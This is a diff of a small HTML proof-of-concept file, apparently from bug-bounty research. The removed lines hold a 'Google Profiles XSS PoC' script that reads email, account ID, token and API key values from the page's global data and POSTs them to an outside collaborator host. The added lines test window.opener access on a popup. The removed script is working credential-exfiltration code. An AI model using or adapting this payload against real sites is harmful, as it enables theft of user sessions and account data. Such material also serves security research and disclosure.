@@ -1,39 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>XSS Data Exfiltration PoC</title>
+  <title>Evil Test</title>
 </head>
 <body>
-<h2>Google Profiles XSS PoC</h2>
-<p>If you see this, the payload executed successfully.</p>
+  <h3>Opener Test</h3>
+  <script>
+    // Open the target site in a popup
+    const w = window.open("https://chatgpt.com/g/g-y2KnRe0w4-bug-hunter-gpt");
 
-<script>
-(function() {
-  try {
-    // Extract sensitive values
-    const sensitive = {
-      email: window.WIZ_global_data?.oPEP7c,
-      gaia: window.WIZ_global_data?.qDCSke,
-      token: window.WIZ_global_data?.SNlM0e,
-      apiKey: window.WIZ_global_data?.ooOwdd,
-      uploadUrl: window.WIZ_global_data?.Eyv8f,
-      dumpTime: new Date().toISOString()
-    };
-
-    // Send them via POST to your collaborator
-    fetch("https://thmgpg2z.ssrf.cvssadvisor.com/dump", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(sensitive)
-    });
-  } catch (e) {
-    fetch("https://thmgpg2z.ssrf.cvssadvisor.com/error", {
-      method: "POST",
-      body: e.toString()
-    });
-  }
-})();
-</script>
+    // Try to check if we have an opener
+    setTimeout(() => {
+      if (w && w.opener) {
+        console.log("✅ Popup has an opener reference");
+        try {
+          console.log("Can we access opener?", w.opener.location.href);
+        } catch (e) {
+          console.warn("⛔ Can't read opener properties (SOP blocks it):", e.message);
+        }
+      } else {
+        console.log("❌ No opener relationship");
+      }
+    }, 2000);
+  </script>
 </body>
 </html>
